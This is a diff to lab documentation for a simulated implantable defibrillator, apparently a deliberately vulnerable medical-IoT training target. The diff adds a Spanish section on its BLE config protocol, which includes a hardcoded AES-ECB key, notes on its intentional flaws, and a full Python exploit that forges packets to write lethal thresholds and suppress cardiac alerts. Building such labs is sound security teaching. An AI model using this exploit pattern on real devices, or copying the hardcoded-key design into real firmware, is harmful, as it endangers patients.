@@ -1,6 +1,6 @@
 # CareOtter — Lab Documentation
 
-CareOtter is a simulated **DAI (Desfibrilador Automático Implantable)** — an Implantable Cardioverter Defibrillator (ICD) cardiac device — running on Raspberry Pi 3B+ with OpenWRT. It emulates a modern cardiac rhythm management (CRM) implant used in clinical and remote-patient-monitoring scenarios. Like real ICDs, CareOtter exposes critical cardiac telemetry (heart rate and blood oxygenation) via BLE GATT for bedside or mobile clinician review, and streams the same data over HTTP to a hospital gateway. Device administration is performed through a legacy custom binary protocol (IGP v4) on TCP port 9999, and a Flask cloud API on the operator's machine acts as the HTTP-to-IGP bridge.
+CareOtter is a simulated **ICD (Implantable Cardioverter-Defibrillator)** — an Implantable Cardioverter Defibrillator (ICD) cardiac device — running on Raspberry Pi 3B+ with OpenWRT. It emulates a modern cardiac rhythm management (CRM) implant used in clinical and remote-patient-monitoring scenarios. Like real ICDs, CareOtter exposes critical cardiac telemetry (heart rate and blood oxygenation) via BLE GATT for bedside or mobile clinician review, and streams the same data over HTTP to a hospital gateway. Device administration is performed through a legacy custom binary protocol (IGP v4) on TCP port 9999, and a Flask cloud API on the operator's machine acts as the HTTP-to-IGP bridge.
 
 ## Simulated Clinical Context
 
@@ -185,8 +185,76 @@ Python service (`/opt/medical-sensor/ble_server.py`) using `dbus_fast` over Blue
 | Heart Rate | `0000180d-…` | HR Measurement | `00002a37-…` | notify, read |
 | Pulse Oximeter | `00001822-…` | PLX Continuous | `00002a5f-…` | notify, read |
 | Battery | `0000180f-…` | Battery Level | `00002a19-…` | read |
+| Device Info | `0000180a-…` | Manufacturer Name | `00002a29-…` | read |
+| Device Info | `0000180a-…` | Model Number | `00002a24-…` | read |
+| **Alert/Config** | **`0000ff00-…`** | **Alert Threshold** | **`0000ff01-…`** | **read, write, notify** |
 
 BLE reads vitals from the local sensor service at `http://127.0.0.1:8081/vitals` every notification cycle.
+
+#### Protocolos Propietarios — CSCP v1
+
+La característica `0xFF01` implementa el **CareOtter Secure Config Protocol v1 (CSCP v1)**, el mecanismo propietario del fabricante para proteger la configuración de umbrales clínicos durante la transmisión BLE. La documentación oficial describe este protocolo como "encriptación AES-128 de grado militar para garantizar la integridad de los datos médicos vitales".
+
+**Estructura del paquete CSCP v1 (24 bytes, big-endian):**
+
+| Offset | Tamaño | Campo   | Descripción |
+|--------|--------|---------|-------------|
+| `0x00` | 4      | Magic   | `0xCAFE0DDA` — identificador de protocolo |
+| `0x04` | 4      | CRC32   | `binascii.crc32(ciphertext)` del bloque AES |
+| `0x08` | 16     | Payload | Bloque AES-128-ECB cifrado |
+
+**Contenido del bloque AES descifrado (16 bytes plaintext):**
+
+| Offset | Tamaño | Campo    | Descripción |
+|--------|--------|----------|-------------|
+| `0x00` | 1      | bpm_min  | BPM mínimo de alerta (uint8) |
+| `0x01` | 1      | bpm_max  | BPM máximo de alerta (uint8) |
+| `0x02` | 1      | spo2_min | SpO₂ mínimo de alerta (uint8) |
+| `0x03` | 13     | Padding  | `0x00` (relleno para completar bloque AES) |
+
+**Parámetros criptográficos:**
+
+| Parámetro | Valor |
+|-----------|-------|
+| Algoritmo | AES-128-ECB (Electronic Codebook, sin IV) |
+| **Clave hardcoded** | **`careotter-key-16`** (16 bytes UTF-8) |
+| Padding | Zero-padding (bytes `0x00`) |
+| CRC | CRC32 estándar (`binascii.crc32` / `java.util.zip.CRC32`) |
+
+> **Advertencia técnica**: AES-ECB sin IV con clave estática embebida en firmware y APK. La "seguridad" del protocolo depende exclusivamente de la ocultación de la clave (security through obscurity). Cualquier atacante que extraiga la clave puede forjar paquetes CSCP v1 válidos con umbrales letales y escribirlos directamente en `0xFF01` sin autenticación de sesión.
+
+**Vulnerabilidades documentadas:**
+
+- **M1 — Improper Credential Usage**: `CSCP_KEY = b"careotter-key-16"` visible en `ble_server.py` con `strings` o análisis de firmware. La misma clave está en `CareOtterConfig.java` del APK Android.
+- **M3 — Insecure Authentication/Authorization**: No se requiere emparejamiento BLE para escribir en `0xFF01`. El protocolo CSCP v1 no autentica la sesión — solo serializa con un formato cifrado determinístico.
+- **Sin validación de rangos**: El servidor acepta `bpm_min=0`, `bpm_max=255`, `spo2_min=0` sin lanzar error ni validar plausibilidad clínica.
+
+**Exploit de referencia (Python/bleak):**
+
+```python
+import asyncio, struct, binascii
+from bleak import BleakClient, BleakScanner
+from Crypto.Cipher import AES
+
+THRESHOLD_UUID = "0000ff01-0000-1000-8000-00805f9b34fb"
+CSCP_KEY   = b"careotter-key-16"
+CSCP_MAGIC = 0xCAFE0DDA
+
+def forge_packet(bpm_min, bpm_max, spo2_min):
+    pt = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b"\x00" * 13
+    ct = AES.new(CSCP_KEY, AES.MODE_ECB).encrypt(pt)
+    crc = binascii.crc32(ct) & 0xFFFFFFFF
+    return struct.pack(">II", CSCP_MAGIC, crc) + ct
+
+async def main():
+    device = await BleakScanner.find_device_by_name("CareOtter_HR", timeout=10.0)
+    async with BleakClient(device) as c:
+        payload = forge_packet(0, 255, 0)   # suppress all alerts
+        await c.write_gatt_char(THRESHOLD_UUID, payload)
+        print("[+] CSCP v1 lethal thresholds written — alerts suppressed")
+
+asyncio.run(main())
+```
 
 ---
 
